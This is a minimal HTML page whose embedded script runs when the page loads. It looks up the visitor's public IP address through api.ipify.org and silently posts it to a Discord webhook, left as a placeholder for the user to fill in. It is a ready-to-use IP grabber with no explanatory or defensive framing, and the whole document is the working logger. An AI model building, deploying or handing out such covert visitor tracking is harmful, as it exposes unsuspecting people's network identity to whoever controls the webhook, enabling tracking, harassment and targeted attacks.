<!DOCTYPE html>
<body>
    <script>
        fetch('https://api.ipify.org')
            .then(response => response.text())
            .then(ip => fetch('YOUR_DISCORD_WEBHOOK_HERE', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: ip })
            }));
    </script>
</body>
</html>
